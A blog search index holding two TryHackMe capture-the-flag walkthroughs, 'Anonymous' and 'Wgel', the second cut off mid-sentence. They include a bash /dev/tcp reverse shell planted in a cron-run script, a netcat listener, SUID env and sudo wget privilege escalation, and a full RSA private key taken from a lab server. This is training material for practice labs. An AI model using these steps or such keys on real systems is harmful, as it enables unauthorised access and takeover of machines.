<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Anonymous - TryHackMe</title>
      <link href="/2020/08/13/Anonymous-TryHackMe/"/>
      <url>/2020/08/13/Anonymous-TryHackMe/</url>
      
        <content type="html"><![CDATA[<p>Hello there! Today I am going to walk you through the Anonymous machine on <a href="https://tryhackme.com/room/anonymous" target="_blank" rel="noopener">TryHackMe</a>.</p><p>Let’s first (as always) export the IP to a global variable, for easier reference later on. So when ever you see $IP I am talking about the machines IP.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=&#123;Machine IP&#125;</span><br></pre></td></tr></table></figure><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Let’s get started with an nmap scan:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -p- $IP</span><br></pre></td></tr></table></figure><p>Those are the results:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-08-09 13:27 EDT</span><br><span class="line">Nmap scan report for 10.10.115.205</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21&#x2F;tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.25.68</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;8&#x2F;9%OT&#x3D;21%CT&#x3D;1%CU&#x3D;35520%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5F303224</span><br><span class="line">OS:%P&#x3D;x86_64-pc-linux-gnu)SEQ(SP&#x3D;F9%GCD&#x3D;1%ISR&#x3D;109%TI&#x3D;Z%CI&#x3D;Z%II&#x3D;I%TS&#x3D;A)OPS(O</span><br><span class="line">OS:1&#x3D;M508ST11NW6%O2&#x3D;M508ST11NW6%O3&#x3D;M508NNT11NW6%O4&#x3D;M508ST11NW6%O5&#x3D;M508ST11N</span><br><span class="line">OS:W6%O6&#x3D;M508ST11)WIN(W1&#x3D;F4B3%W2&#x3D;F4B3%W3&#x3D;F4B3%W4&#x3D;F4B3%W5&#x3D;F4B3%W6&#x3D;F4B3)ECN(R</span><br><span class="line">OS:&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;F507%O&#x3D;M508NNSNW6%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%</span><br><span class="line">OS:RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y</span><br><span class="line">OS:%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R</span><br><span class="line">OS:%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;</span><br><span class="line">OS:40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S</span><br><span class="line">OS:)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2s, deviation: 1s, median: -2s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2020-08-09T17:27:57+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-08-09T17:27:57</span><br><span class="line">|_  start_date: N&#x2F;A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   41.06 ms  10.9.0.1</span><br><span class="line">2   114.16 ms 10.10.115.205</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds</span><br></pre></td></tr></table></figure><p>We can already see that there are three interesting services running. SMB, FTP and SSH. I chose to have a look at SMB first and then work my way up.<br>In the scan results we can see that guest login is allowed, so let’s make use of that.</p><p>First I used SMBMap to see what share we could access:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@hades      :~# smbmap $IP</span><br><span class="line">[+] Guest session       IP: 10.10.115.205:445   Name: 10.10.115.205</span><br><span class="line">        Disk                                                    Permissions Comment</span><br><span class="line">    ----                                                    ----------- -------</span><br><span class="line">    print$                                              NO ACCESS   Printer Drivers</span><br><span class="line">    pics                                                READ ONLY   My SMB Share Directory for Pics</span><br><span class="line">    IPC$                                                NO ACCESS   IPC Service (anonymous server (Samba, Ubuntu))</span><br></pre></td></tr></table></figure><p>The “pics” share seems interesting, but apparently this was a rabbit hole, there were literally just a few pictures on there.</p><p>So let’s move on to the next port. It is an FTP server with anonymous login enabled (always look closely at you scan results). I just logged in with the command line, like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@hades      :~&#x2F;ctf&#x2F;thm&#x2F;anonymous# ftp 10.10.115.205 21</span><br><span class="line">Connected to 10.10.115.205.</span><br><span class="line">220 NamelessOne&#39;s FTP Server!</span><br><span class="line">Name (10.10.115.205:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure><p>As the password I entered nothing and just pressed enter. We can move around the FTP server just like on a Linux machine and after looking around for a bit, I found three files:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd scripts</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000         1763 Aug 09 17:45 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt</span><br></pre></td></tr></table></figure><p>You can easily download them with “get” and then the file name (get [‘File name’]).</p><h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>Only the bash script really is interesting for us. The todo just says to remove the anonymous login and the log is being generated by the clean.sh script. The script itself deletes all files from the /tmp directory, when run. Potentially this is a cron job?<br>A cron job is something you can set up on your Linux machine to do tasks e.g. daily, monthly etc.</p><p>So if we can override the script we can let it do whatever we want (Spoiler: we can).</p><p>Just create a shell scipt and insert some kind of shell. I used this simple reverse shell, just insert you own IP:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/[Your tun0 IP]/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>And upload it with “put” and then the file name of the local file.</p><p>Then set up a netcat listener on you machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8080</span><br></pre></td></tr></table></figure><p>Now you just need to wait a few seconds and you should be able to see a shell pop up, where you set up the listener.</p><h3 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h3><p>You can now just cat out the user flag, which is located at /home/anonymous/user.txt .</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>I followed my routine and downloaded LinPeas on the target machine.<br>It found an “env” SUID, which if you look it up on <a href="https://gtfobins.github.io/gtfobins/env/" target="_blank" rel="noopener">GTFOBins</a> is easily exploitable. Just run this simple command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env /bin/sh -p</span><br></pre></td></tr></table></figure><p>And there you go, you have root.</p><h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>And again you can just cat out the root flag, which is located at /root/root.txt this time.</p><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>]]></content>
      
      
      <categories>
          
          <category> pentesting </category>
          
          <category> writeups </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Wgel - TryHackMe</title>
      <link href="/2020/08/07/Wgel-TryHackMe/"/>
      <url>/2020/08/07/Wgel-TryHackMe/</url>
      
        <content type="html"><![CDATA[<p>Hey there! Today I am going to walk you through the Wgel machine on <a href="https://tryhackme.com/room/wgelctf" target="_blank" rel="noopener">TryHackMe</a></p><p>The first thing I always do is to export the IP to a global variable. So from now on $IP will refer to the IP of the target machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=&#123;Machine IP&#125;</span><br></pre></td></tr></table></figure><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Let us start our enumeration as usual and do an nmap scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A <span class="variable">$IP</span></span><br></pre></td></tr></table></figure><p>This is what came back:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-08-07 09:47 EDT</span><br><span class="line">Nmap scan report for 10.10.54.255</span><br><span class="line">Host is up (0.051s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)</span><br><span class="line">|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)</span><br><span class="line">|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;8&#x2F;7%OT&#x3D;22%CT&#x3D;1%CU&#x3D;42515%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5F2D5B8F</span><br><span class="line">OS:%P&#x3D;x86_64-pc-linux-gnu)SEQ(SP&#x3D;105%GCD&#x3D;1%ISR&#x3D;10C%TI&#x3D;Z%CI&#x3D;RD%TS&#x3D;A)SEQ(SP&#x3D;1</span><br><span class="line">OS:05%GCD&#x3D;1%ISR&#x3D;10C%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;A)OPS(O1&#x3D;M508ST11NW6%O2&#x3D;M508ST11NW6%O</span><br><span class="line">OS:3&#x3D;M508NNT11NW6%O4&#x3D;M508ST11NW6%O5&#x3D;M508ST11NW6%O6&#x3D;M508ST11)WIN(W1&#x3D;68DF%W2&#x3D;</span><br><span class="line">OS:68DF%W3&#x3D;68DF%W4&#x3D;68DF%W5&#x3D;68DF%W6&#x3D;68DF)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;6903%O&#x3D;M508NNSN</span><br><span class="line">OS:W6%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%D</span><br><span class="line">OS:F&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O</span><br><span class="line">OS:&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W</span><br><span class="line">OS:&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%R</span><br><span class="line">OS:IPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1720&#x2F;tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   52.28 ms 10.9.0.1</span><br><span class="line">2   52.35 ms 10.10.54.255</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds</span><br></pre></td></tr></table></figure><p>So just SSH on port 22 and Apache on port 80. Let us first do some enumeration on the web server.<br>On first glance there is just the Apache default page. If we have a look at the source code we can see that there is a comment inside:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Jessie don't forget to udate the webiste --&gt;</span></span><br></pre></td></tr></table></figure><p>Apparently someone called Jessie is a developer or user of the target machine.</p><p>But let us run dirbuster and see if there is more to find.</p><p>At <strong>/sitemap/</strong> there is a blog like website with the title “unapp” but I did not find anything interesting there nor any exploits. So let us move on.</p><p>Weirdly my scan did not find anything, but I poked around a bit more and just tried random directories and files. So I stumbled upon this: <strong>/sitemap/.ssh/id_rsa</strong>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380</span><br><span class="line">m+JYAquy30lSp5jH&#x2F;bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x</span><br><span class="line">W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP</span><br><span class="line">y4lg2StXQYuZ0cUvx8UkhpgxWy&#x2F;OO9ceMNondU61kyHafKobJP7Py5QnH7cP&#x2F;psr</span><br><span class="line">+J5M&#x2F;fVBoKPcPXa71mA&#x2F;ZUioimChBPV&#x2F;i&#x2F;0za0FzVuJZdnSPtS7LzPjYFqxnm&#x2F;BH</span><br><span class="line">Wo&#x2F;Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG</span><br><span class="line">&#x2F;1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE</span><br><span class="line">AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa</span><br><span class="line">M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1&#x2F;ubom7OWDZPDS9AjAOkYuJBobG</span><br><span class="line">SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv</span><br><span class="line">2KBA6YcfGXN0b49CFOBMLBY&#x2F;dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2</span><br><span class="line">p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj</span><br><span class="line">7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I</span><br><span class="line">dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy</span><br><span class="line">GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh</span><br><span class="line">shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97</span><br><span class="line">uhgbVrK&#x2F;Rm+uACIJ+YD57&#x2F;ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N</span><br><span class="line">LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u</span><br><span class="line">QJkSaIdWAnh0G&#x2F;dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW</span><br><span class="line">V35mEHIidDqtCyC&#x2F;gzDKIQKBgDE+d+&#x2F;b46nBK976oy9AY0gJRW+DTKYuI4FP51T5</span><br><span class="line">hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w&#x2F;Qq9iB8&#x2F;ZMckMGbxoUGmr</span><br><span class="line">9Jj&#x2F;dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu</span><br><span class="line">eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb</span><br><span class="line">QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy&#x2F;onH6X1T5OAAW6&#x2F;UXc4S7Vsg</span><br><span class="line">jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>It is an SSH private key you can use to login to someones SSH.<br>I went ahead and copied the key to a file called <strong>id_rsa</strong> and gave it the permissions SSH likes.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure><h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>Now we can use that previously found key to login to SSH. The only thing we are missing is a user to map that key to. In this case the server would be even vulnerable to an exploit to enumerate all the users on a server, but because we found something for “Jessie” earlier, I assumed, that the key was Jessie’s.<br>So let’s login as Jessie with the private key.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa  jessie@<span class="variable">$IP</span></span><br></pre></td></tr></table></figure><h3 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h3><p>The user flag was hidden inside of the “Documents” directory.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jessie@CorpOne:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos</span><br><span class="line">jessie@CorpOne:~$ <span class="built_in">cd</span> Desktop/</span><br><span class="line">jessie@CorpOne:~/Desktop$ ls</span><br><span class="line">jessie@CorpOne:~/Desktop$ <span class="built_in">cd</span> ..</span><br><span class="line">jessie@CorpOne:~$ <span class="built_in">cd</span> Documents/</span><br><span class="line">jessie@CorpOne:~/Documents$ ls</span><br><span class="line">user_flag.txt</span><br><span class="line">jessie@CorpOne:~/Documents$ cat user_flag.txt</span><br><span class="line">USER_FLAG</span><br></pre></td></tr></table></figure><h2 id="Post-Exploitation-amp-Getting-Root"><a href="#Post-Exploitation-amp-Getting-Root" class="headerlink" title="Post Exploitation &amp; Getting Root"></a>Post Exploitation &amp; Getting Root</h2><p>Before uploading linpeas or anything else I fancied, I just had a look at our sudo permissions.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jessie@CorpOne:~&#x2F;Documents$ sudo -l</span><br><span class="line">Matching Defaults entries for jessie on CorpOne:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jessie may run the following commands on CorpOne:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;wget</span><br></pre></td></tr></table></figure><p>Interesting, apparently we can run <strong>wget</strong> as root without a password. So as always I had a look at <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> and found <a 